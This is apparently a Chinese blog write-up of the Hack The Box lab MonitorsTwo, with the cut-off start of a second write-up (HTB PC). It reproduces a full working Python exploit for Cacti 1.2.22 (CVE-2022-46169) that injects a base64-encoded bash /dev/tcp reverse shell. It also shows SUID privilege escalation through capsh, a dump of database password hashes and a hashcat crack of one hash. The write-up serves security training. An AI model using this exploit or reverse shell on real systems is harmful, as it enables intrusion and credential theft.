        <content type="html"><![CDATA[<h1 id="HTB-MonitorsTwo"><a href="#HTB-MonitorsTwo" class="headerlink" title="HTB MonitorsTwo"></a>HTB MonitorsTwo</h1><p>老规矩信息收集了：</p><p>NMAP信息收集</p><pre class=" language-xml"><code class="language-xml">┌──(kali㉿kali)-[~/桌面]└─$ sudo nmap --min-rate 1000 10.10.11.211 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-19 09:18 CSTNmap scan report for 10.10.11.211Host is up (0.16s latency).Not shown: 998 closed tcp ports (reset)PORT   STATE SERVICE22/tcp open  ssh80/tcp open  http</code></pre><pre class=" language-xml"><code class="language-xml">┌──(kali㉿kali)-[~]└─$ sudo nmap -sT -sV -O -p22,80 10.10.11.211Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-19 09:19 CSTNmap scan report for 10.10.11.211Host is up (0.15s latency).PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)80/tcp open  http    nginx 1.18.0 (Ubuntu)Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portAggressive OS guesses: Linux 5.0 (97%), Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 5.0 - 5.3 (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%)No exact OS matches for host (test conditions non-ideal).Network Distance: 2 hopsService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 15.07 seconds</code></pre><p>fscan信息收集</p><pre class=" language-xml"><code class="language-xml">┌──(kali㉿kali)-[~/Tools/fscan]└─$ ./fscan -h 10.10.11.211   ___                              _    / _ \     ___  ___ _ __ __ _  ___| | __  / /_\/____/ __|/ __| '__/ _` |/ __| |/ // /_\\_____\__ \ (__| | | (_| | (__|   &lt;  \____/     |___/\___|_|  \__,_|\___|_|\_\                        fscan version: 1.8.2start infoscantrying RunIcmp2The current user permissions unable to send icmp packetsstart ping(icmp) Target 10.10.11.211    is alive[*] Icmp alive hosts len is: 110.10.11.211:22 openOpen result.txt error, open result.txt: permission denied10.10.11.211:80 openOpen result.txt error, open result.txt: permission denied[*] alive ports len is: 2start vulscan[*] WebTitle: http://10.10.11.211       code:200 len:13998  title:登录到CactiOpen result.txt error, open result.txt: permission denied已完成 1/2 [-] ssh 10.10.11.211:22 root Admin@123 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain</code></pre><p>fscan下面这个ssh爆破就不要让他试了，这个不太可能而且太没有含金量了</p><p>‍</p><p>只有22和80，我们访问80吧：</p><p>​<img src="/Blogimages/HTB_MonitorsTwo/image-20230519093555-c6gr5rc.png" alt="image">​</p><p>弱口令和sql注入无效，寻找nday</p><p>发现是一个Cacti 版本 1.2.22，找POC(<a href="https://zhuanlan.zhihu.com/p/627180981)%EF%BC%9A">https://zhuanlan.zhihu.com/p/627180981)：</a></p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># https://www.exploit-db.com/exploits/51166</span><span class="token comment" spellcheck="true"># Exploit Title: Cacti v1.2.22 - Remote Command Execution (RCE)</span><span class="token comment" spellcheck="true"># Exploit Author: Riadh BOUCHAHOUA</span><span class="token comment" spellcheck="true"># Discovery Date: 2022-12-08</span><span class="token comment" spellcheck="true"># Vendor Homepage: https://www.cacti.net/</span><span class="token comment" spellcheck="true"># Software Links : https://github.com/Cacti/cacti</span><span class="token comment" spellcheck="true"># Tested Version: 1.2.2x &lt;= 1.2.22</span><span class="token comment" spellcheck="true"># CVE: CVE-2022-46169</span><span class="token comment" spellcheck="true"># Tested on OS: Debian 10/11</span><span class="token comment" spellcheck="true"># !/usr/bin/env python3</span><span class="token keyword">import</span> random<span class="token keyword">import</span> sys<span class="token keyword">import</span> httpx<span class="token punctuation">,</span> urllib<span class="token keyword">class</span> <span class="token class-name">Exploit</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> url<span class="token punctuation">,</span> proxy<span class="token operator">=</span>None<span class="token punctuation">,</span> rs_host<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">,</span> rs_port<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>url <span class="token operator">=</span> url        self<span class="token punctuation">.</span>session <span class="token operator">=</span> httpx<span class="token punctuation">.</span>Client<span class="token punctuation">(</span>headers<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"User-Agent"</span><span class="token punctuation">:</span> self<span class="token punctuation">.</span>random_user_agent<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> proxies<span class="token operator">=</span>proxy<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>rs_host <span class="token operator">=</span> rs_host        self<span class="token punctuation">.</span>rs_port <span class="token operator">=</span> rs_port    <span class="token keyword">def</span> <span class="token function">exploit</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># cacti local ip from the url for the X-Forwarded-For header</span>        <span class="token comment" spellcheck="true"># local_cacti_ip  = self.url.split("//")[1].split("/")[0]</span>        local_cacti_ip <span class="token operator">=</span> <span class="token string">'127.0.0.1'</span>        headers <span class="token operator">=</span> <span class="token punctuation">{</span>            <span class="token string">'X-Forwarded-For'</span><span class="token punctuation">:</span> f<span class="token string">'{local_cacti_ip}'</span>        <span class="token punctuation">}</span>        revshell <span class="token operator">=</span> f<span class="token string">"bash -c 'exec bash -i &amp;>/dev/tcp/{self.rs_host}/{self.rs_port} &lt;&amp;1'"</span>        <span class="token keyword">import</span> base64        b64_revshell <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>revshell<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>        payload <span class="token operator">=</span> f<span class="token string">";echo {b64_revshell} | base64 -d | bash -"</span>        payload <span class="token operator">=</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        urls <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token comment" spellcheck="true"># Adjust the range to fit your needs ( wider the range, longer the script will take to run the more success you will have achieving a reverse shell)</span>        <span class="token keyword">for</span> host_id <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> local_data_ids <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                urls<span class="token punctuation">.</span>append<span class="token punctuation">(</span>                    f<span class="token string">"{self.url}/remote_agent.php?action=polldata&amp;local_data_ids[]={local_data_ids}&amp;host_id={host_id}&amp;poller_id=1{payload}"</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> url <span class="token keyword">in</span> urls<span class="token punctuation">:</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*]try: {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                r <span class="token operator">=</span> self<span class="token punctuation">.</span>session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">"{r.status_code} - {r.text}"</span><span class="token punctuation">)</span>            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>                sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">pass</span>    <span class="token keyword">def</span> <span class="token function">random_user_agent</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        ua_list <span class="token operator">=</span> <span class="token punctuation">[</span>            <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"</span><span class="token punctuation">,</span>            <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0"</span><span class="token punctuation">,</span>        <span class="token punctuation">]</span>        <span class="token keyword">return</span> random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>ua_list<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">parse_args</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">import</span> argparse    argparser <span class="token operator">=</span> argparse<span class="token punctuation">.</span>ArgumentParser<span class="token punctuation">(</span><span class="token punctuation">)</span>    argparser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">"-u"</span><span class="token punctuation">,</span> <span class="token string">"--url"</span><span class="token punctuation">,</span> help<span class="token operator">=</span><span class="token string">"Target URL (e.g. http://192.168.1.100/cacti)"</span><span class="token punctuation">)</span>    argparser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">"-p"</span><span class="token punctuation">,</span> <span class="token string">"--remote_port"</span><span class="token punctuation">,</span> help<span class="token operator">=</span><span class="token string">"reverse shell port to connect to"</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>    argparser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">"-i"</span><span class="token punctuation">,</span> <span class="token string">"--remote_ip"</span><span class="token punctuation">,</span> help<span class="token operator">=</span><span class="token string">"reverse shell IP to connect to"</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> argparser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> None<span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># Open a nc listener (rs_host+rs_port) and run the script against a CACTI server with its LOCAL IP URL</span>    args <span class="token operator">=</span> parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>    e <span class="token operator">=</span> Exploit<span class="token punctuation">(</span>args<span class="token punctuation">.</span>url<span class="token punctuation">,</span> rs_host<span class="token operator">=</span>args<span class="token punctuation">.</span>remote_ip<span class="token punctuation">,</span> rs_port<span class="token operator">=</span>args<span class="token punctuation">.</span>remote_port<span class="token punctuation">)</span>    e<span class="token punctuation">.</span>exploit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>现在本地监听一个端口：</p><pre class=" language-bash"><code class="language-bash">nc -lvnp 2333</code></pre><p>利用EXP:</p><pre class=" language-bash"><code class="language-bash">python exp.py -u http://10.10.11.211/ -i 10.10.14.40 -p 2333</code></pre><p>这个反弹shell的ip要是本地的10地址</p><p>​<img src="/Blogimages/HTB_MonitorsTwo/image-20230519093807-tuyxz4l.png" alt="image">​</p><p>拿到shell后可以改交互方式：</p><pre class=" language-bash"><code class="language-bash">python -c <span class="token string">"import pty;pty.spawn('/bin/bash')"</span></code></pre><p>但是这题好像没有python环境</p><p>接下来我们看权限，发现shell后权限不够：</p><pre class=" language-sh"><code class="language-sh">bash-5.1$ whoamiwww-data</code></pre><p>这里也没有sudo -l的提权</p><p>用三个查找suid提权方法（任选其一即可）：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">find</span> / -perm -u<span class="token operator">=</span>s -type f 2<span class="token operator">></span>/dev/null<span class="token function">find</span> / -user root -perm -4000 -exec <span class="token function">ls</span> -ldb <span class="token punctuation">{</span><span class="token punctuation">}</span> \<span class="token punctuation">;</span><span class="token function">find</span> / -user root -perm -4000 -print 2<span class="token operator">></span>/dev/null</code></pre><p>​<img src="/Blogimages/HTB_MonitorsTwo/image-20230519095049-pqc3pt7.png" alt="image">​</p><p>有个capsh入了法眼：</p><p>​<img src="/Blogimages/HTB_MonitorsTwo/image-20230519095546-z5ln2yd.png" alt="image">​</p><p>​<code>./sbin/capsh --gid=0 --uid=0 --</code>​</p><p>​<img src="/Blogimages/HTB_MonitorsTwo/image-20230519094553-vjwlly9.png" alt="image">​</p><p>成功提权，但是没有发现flag.txt之类的</p><p>有个sh文件，我们看看：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">cat</span> entrypoint.sh<span class="token comment" spellcheck="true">#!/bin/bash</span><span class="token keyword">set</span> -exwait-for-it db:3306 -t 300 -- <span class="token keyword">echo</span> <span class="token string">"database is connected"</span><span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token operator">!</span> <span class="token punctuation">$(</span>mysql --host<span class="token operator">=</span>db --user<span class="token operator">=</span>root --password<span class="token operator">=</span>root cacti -e <span class="token string">"show tables"</span><span class="token punctuation">)</span> <span class="token operator">=</span>~ <span class="token string">"automation_devices"</span> <span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>    mysql --host<span class="token operator">=</span>db --user<span class="token operator">=</span>root --password<span class="token operator">=</span>root cacti <span class="token operator">&lt;</span> /var/www/html/cacti.sql    mysql --host<span class="token operator">=</span>db --user<span class="token operator">=</span>root --password<span class="token operator">=</span>root cacti -e <span class="token string">"UPDATE user_auth SET must_change_password='' WHERE username = 'admin'"</span>    mysql --host<span class="token operator">=</span>db --user<span class="token operator">=</span>root --password<span class="token operator">=</span>root cacti -e <span class="token string">"SET GLOBAL time_zone = 'UTC'"</span><span class="token keyword">fi</span><span class="token function">chown</span> www-data:www-data -R /var/www/html<span class="token comment" spellcheck="true"># first arg is `-f` or `--some-option`</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">${1#-}</span>"</span> <span class="token operator">!=</span> <span class="token string">"<span class="token variable">$1</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>        <span class="token keyword">set</span> -- apache2-foreground <span class="token string">"<span class="token variable">$@</span>"</span><span class="token keyword">fi</span><span class="token function">exec</span> <span class="token string">"<span class="token variable">$@</span>"</span></code></pre><p>发现是连接数据库的，还有数据库的账号和密码：</p><p>但是连不上，我们用-e来执行命令：</p><pre class=" language-bash"><code class="language-bash">mysql --host<span class="token operator">=</span>db --user<span class="token operator">=</span>root --password<span class="token operator">=</span>root cacti -e <span class="token string">"show tables;"</span></code></pre><pre class=" language-bash"><code class="language-bash">mysql --host<span class="token operator">=</span>db --user<span class="token operator">=</span>root --password<span class="token operator">=</span>root cacti -e <span class="token string">"show tables;"</span>Tables_in_cactiaggregate_graph_templatesaggregate_graph_templates_graphaggregate_graph_templates_itemaggregate_graphsaggregate_graphs_graph_itemaggregate_graphs_itemsautomation_devicesautomation_graph_rule_itemsautomation_graph_rulesautomation_ipsautomation_match_rule_itemsautomation_networksautomation_processesautomation_snmpautomation_snmp_itemsautomation_templatesautomation_tree_rule_itemsautomation_tree_rulescdefcdef_itemscolor_template_itemscolor_templatescolorsdata_debugdata_inputdata_input_datadata_input_fieldsdata_localdata_source_profilesdata_source_profiles_cfdata_source_profiles_rradata_source_purge_actiondata_source_purge_tempdata_source_stats_dailydata_source_stats_hourlydata_source_stats_hourly_cachedata_source_stats_hourly_lastdata_source_stats_monthlydata_source_stats_weeklydata_source_stats_yearlydata_templatedata_template_datadata_template_rrdexternal_linksgraph_localgraph_template_inputgraph_template_input_defsgraph_templatesgraph_templates_gprintgraph_templates_graphgraph_templates_itemgraph_treegraph_tree_itemshosthost_graphhost_snmp_cachehost_snmp_queryhost_templatehost_template_graphhost_template_snmp_queryplugin_configplugin_db_changesplugin_hooksplugin_realmspollerpoller_commandpoller_data_template_field_mappingspoller_itempoller_outputpoller_output_boostpoller_output_boost_local_data_idspoller_output_boost_processespoller_output_realtimepoller_reindexpoller_resource_cachepoller_timeprocessesreportsreports_itemssessionssettingssettings_treesettings_usersettings_user_groupsitessnmp_querysnmp_query_graphsnmp_query_graph_rrdsnmp_query_graph_rrd_svsnmp_query_graph_svsnmpagent_cachesnmpagent_cache_notificationssnmpagent_cache_textual_conventionssnmpagent_managerssnmpagent_managers_notificationssnmpagent_mibssnmpagent_notifications_loguser_authuser_auth_cacheuser_auth_groupuser_auth_group_membersuser_auth_group_permsuser_auth_group_realmuser_auth_permsuser_auth_realmuser_domainsuser_domains_ldapuser_logvdefvdef_itemsversion</code></pre><pre class=" language-bash"><code class="language-bash">mysql --host<span class="token operator">=</span>db --user<span class="token operator">=</span>root --password<span class="token operator">=</span>root cacti -e <span class="token string">"select * from user_auth;"</span></code></pre><p>1       admin   10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ&#x2F;iuqMft&#x2F;llx8utpR1hjC    0       Jamie Thompson  <a href="mailto:&#x61;&#100;&#109;&#105;&#110;&#x40;&#x6d;&#111;&#x6e;&#105;&#x74;&#x6f;&#114;&#x73;&#116;&#119;&#x6f;&#x2e;&#104;&#116;&#x62;">&#x61;&#100;&#109;&#105;&#110;&#x40;&#x6d;&#111;&#x6e;&#105;&#x74;&#x6f;&#114;&#x73;&#116;&#119;&#x6f;&#x2e;&#104;&#116;&#x62;</a></p><p>3       guest   43e9a4ab75570f5b        0       Guest Account           on      on</p><p>4       marcus  10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW&#x2F;MhFYK4C    0       Marcus Brune    <a href="mailto:&#x6d;&#97;&#114;&#99;&#117;&#x73;&#64;&#109;&#111;&#110;&#x69;&#116;&#111;&#114;&#115;&#x74;&#119;&#111;&#x2e;&#x68;&#x74;&#x62;">&#x6d;&#97;&#114;&#99;&#117;&#x73;&#64;&#109;&#111;&#110;&#x69;&#116;&#111;&#114;&#115;&#x74;&#119;&#111;&#x2e;&#x68;&#x74;&#x62;</a></p><p>‍</p><pre class=" language-sh"><code class="language-sh">┌──(kali㉿kali)-[~/HTB/MonitorsTwo]└─$ sudo hashcat -m 3200 -a 0 password.txt /usr/share/wordlists/rockyou.txt.gz     hashcat (v6.2.6) startingOpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 14.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]==================================================================================================================================================* Device #1: pthread-haswell-AMD Ryzen 5 5600H with Radeon Graphics, 1425/2914 MB (512 MB allocatable), 4MCUMinimum password length supported by kernel: 0Maximum password length supported by kernel: 72Hashes: 1 digests; 1 unique digests, 1 unique saltsBitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotatesRules: 1Optimizers applied:* Zero-Byte* Single-Hash* Single-SaltWatchdog: Temperature abort trigger set to 90cHost memory required for this attack: 0 MBDictionary cache building /usr/share/wordlists/rockyou.txt.gz: 33553434 bytesDictionary cache built:* Filename..: /usr/share/wordlists/rockyou.txt.gz* Passwords.: 14344392* Bytes.....: 139921507* Keyspace..: 14344385* Runtime...: 1 sec$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C:funkymonkey                                                        Session..........: hashcatStatus...........: CrackedHash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))Hash.Target......: $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70Jonsd...hFYK4CTime.Started.....: Fri May 19 11:09:23 2023 (2 mins, 4 secs)Time.Estimated...: Fri May 19 11:11:27 2023 (0 secs)Kernel.Feature...: Pure KernelGuess.Base.......: File (/usr/share/wordlists/rockyou.txt.gz)Guess.Queue......: 1/1 (100.00%)Speed.#1.........:       69 H/s (6.85ms) @ Accel:4 Loops:32 Thr:1 Vec:1Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)Progress.........: 8528/14344385 (0.06%)Rejected.........: 0/8528 (0.00%)Restore.Point....: 8512/14344385 (0.06%)Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:992-1024Candidate.Engine.: Device GeneratorCandidates.#1....: mark123 -> funkymonkeyHardware.Mon.#1..: Util: 92%Started: Fri May 19 11:09:17 2023Stopped: Fri May 19 11:11:28 2023</code></pre><p>跑出来密码是funkymonkey，80登陆不了试一下ssh</p><p>‍</p><p>ssh登陆后在用户目录拿到第一个flag</p><p>后来发现他题目给了一个exp.sh:</p><p>​<img src="/Blogimages/HTB_MonitorsTwo/image-20230519104324-02lrxzx.png" alt="image">​</p><p>直接运行：</p><p>​<img src="/Blogimages/HTB_MonitorsTwo/image-20230519104538-9nxcq5a.png" alt="image">​</p><p>然后按照他的提示就提权了，太友善了</p><p>‍</p>]]></content>
      
      
      <categories>
          
          <category> 靶机 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>HTB_PC</title>
      <link href="/2023/05/29/HTB%20PC/"/>
      <url>/2023/05/29/HTB%20PC/</url>
      
        <content type="html"><![CDATA[<h1 id="HTB-PC"><a href="#HTB-PC" class="headerlink" title="HTB PC"></a>HTB PC</h1><p>今天又学一招，配置好<code>/etc/hosts</code>​文件：</p><p>​<img src="/Blogimages/HTB_PC/image-20230529093245-pwj2tjw.png" alt="image">​</p><p>如图所示，这样子就可以直接<code>ping pc</code>​了，不用再<code>ping 10.10.11.214</code>​</p><p>​<img src="/Blogimages/HTB_PC/image-20230529093327-40q2uk7.png" alt="image">​</p><p>只能说太方便辣</p><p>‍</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><pre class=" language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/桌面<span class="token punctuation">]</span>└─$ <span class="token function">sudo</span> nmap --min-rate 10000 -p- 10.10.11.214<span class="token punctuation">[</span>sudo<span class="token punctuation">]</span> kali 的密码：Starting Nmap 7.93 <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at 2023-05-29 09:21 CSTNmap scan report <span class="token keyword">for</span> bogon <span class="token punctuation">(</span>10.10.11.214<span class="token punctuation">)</span>Host is up <span class="token punctuation">(</span>0.40s latency<span class="token punctuation">)</span>.Not shown: 65533 filtered tcp ports <span class="token punctuation">(</span>no-response<span class="token punctuation">)</span>PORT      STATE SERVICE22/tcp    <span class="token function">open</span>  <span class="token function">ssh</span>50051/tcp <span class="token function">open</span>  unknown</code></pre><pre class=" language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/桌面<span class="token punctuation">]</span>└─$ <span class="token function">sudo</span> nmap -sT -sV -O -p 22,50051 10.10.11.214Starting Nmap 7.93 <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at 2023-05-29 09:23 CSTNmap scan report <span class="token keyword">for</span> bogon <span class="token punctuation">(</span>10.10.11.214<span class="token punctuation">)</span>Host is up <span class="token punctuation">(</span>0.37s latency<span class="token punctuation">)</span>.PORT      STATE SERVICE VERSION22/tcp    <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 <span class="token punctuation">(</span>Ubuntu Linux<span class="token punctuation">;</span> protocol 2.0<span class="token punctuation">)</span>50051/tcp <span class="token function">open</span>  unknown1 <span class="token function">service</span> unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service <span class="token keyword">:</span>SF-Port50051-TCP:V<span class="token operator">=</span>7.93%I<span class="token operator">=</span>7%D<span class="token operator">=</span>5/29%Time<span class="token operator">=</span>6473FEB8%P<span class="token operator">=</span>x86_64-pc-linux-gnu%r<span class="token punctuation">(</span>NSF:ULL,2E,<span class="token string">"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\x0SF:6\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0"</span><span class="token punctuation">)</span>%r<span class="token punctuation">(</span>GenericSF:Lines,2E,<span class="token string">"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\SF:x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0"</span><span class="token punctuation">)</span>%r<span class="token punctuation">(</span>GetReSF:quest,2E,<span class="token string">"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\SF:x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0"</span><span class="token punctuation">)</span>%r<span class="token punctuation">(</span>HTTPOSF:ptions,2E,<span class="token string">"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0SF:\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0"</span><span class="token punctuation">)</span>%r<span class="token punctuation">(</span>RTSPSF:Request,2E,<span class="token string">"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\SF:0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0"</span><span class="token punctuation">)</span>%r<span class="token punctuation">(</span>RPCSF:Check,2E,<span class="token string">"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\SF:x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0"</span><span class="token punctuation">)</span>%r<span class="token punctuation">(</span>DNSVeSF:rsionBindReqTCP,2E,<span class="token string">"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\SF:xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0SF:"</span><span class="token punctuation">)</span>%r<span class="token punctuation">(</span>DNSStatusRequestTCP,2E,<span class="token string">"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0SF:\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\SF:0\0\?\0\0"</span><span class="token punctuation">)</span>%r<span class="token punctuation">(</span>Help,2E,<span class="token string">"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0SF:\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\SF:0\0"</span><span class="token punctuation">)</span>%r<span class="token punctuation">(</span>SSLSessionReq,2E,<span class="token string">"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x0SF:5\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0SF:\?\0\0"</span><span class="token punctuation">)</span>%r<span class="token punctuation">(</span>TerminalServerCookie,2E,<span class="token string">"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xfSF:f\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0SF:\0\0\0\0\0\?\0\0"</span><span class="token punctuation">)</span>%r<span class="token punctuation">(</span>TLSSessionReq,2E,<span class="token string">"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?SF:\xff\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x0SF:8\0\0\0\0\0\0\?\0\0"</span><span class="token punctuation">)</span>%r<span class="token punctuation">(</span>Kerberos,2E,<span class="token string">"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xSF:ff\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\SF:0\0\0\0\0\0\?\0\0"</span><span class="token punctuation">)</span>%r<span class="token punctuation">(</span>SMBProgNeg,2E,<span class="token string">"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xSF:ff\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\SF:0\0\0\0\0\0\?\0\0"</span><span class="token punctuation">)</span>%r<span class="token punctuation">(</span>X11Probe,2E,<span class="token string">"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xffSF:\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\SF:0\0\0\0\0\?\0\0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Warning: OSScan results may be unreliable because we could not <span class="token 